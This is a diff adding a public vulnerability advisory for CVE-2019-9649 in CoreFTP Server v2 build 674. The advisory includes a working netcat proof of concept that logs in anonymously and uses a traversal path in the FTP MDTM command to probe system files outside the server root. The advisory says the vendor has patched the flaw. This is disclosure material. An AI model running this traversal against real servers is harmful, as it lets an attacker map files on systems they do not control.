@@ -1,0 +1,41 @@
+# Exploit Title: CoreFTP Server FTP / SFTP Server v2 - Build 674  MDTM Directory Traversal
+# Google Dork: N/A
+# Date: 3/13/2019
+# Exploit Author: Kevin Randall
+# Vendor Homepage: https://www.coreftp.com
+# Software Link: http://www.coreftp.com/server/index.html
+# Version: Firmware: CoreFTP Server FTP / SFTP Server v2 - Build 674
+# Tested on: Windows 7
+# CVE : CVE-2019-9649
+
+*Vendor has confirmed vulnerability and implemented an updated version*
+
+Summary: Summary: By utilizing a directory traversal along with the FTP MDTM command, an attacker can browse outside the root directory to determine if a file exists based on return file size along with the date the file was last modified by using a ..\..\ technique
+Tools used:
+Parrot OS VM
+Windows 7 VM
+FTP / SFTP Server v2 - Build 674
+Netcat
+
+Proof of Concept (PoC):
+
+File 1: ARP.exe
+Type of file: Application(.EXE)
+Description: TCP/IP Arp Command
+Location: C:\Windows\System32\
+Size: 20.5 KB (20,992 bytes)
+Size on disk: 24.0 KB (24,576 bytes)
+Created: Monday July 13, 2009 7:55:11 PM
+Modified: Monday July 13, 2009, 9:14:12 PM
+Accessed: Monday July 13, 2009 7:55:11 PM
+
+#nc -nv 192.168.0.2 21
+(UNKNOWN) [192.168.0.2] 21 (ftp) open
+220 Core FTP Server Version 2.0, build 674, 32-bit, installed 1 days ago Unregistered
+USER anonymous
+331 password required for anonymous
+PASS anonymous@
+230-Logged on
+230
+MDTM C:\..\..\..\..\..\..\Windows\System32\ARP.exe
+213 20090713211412
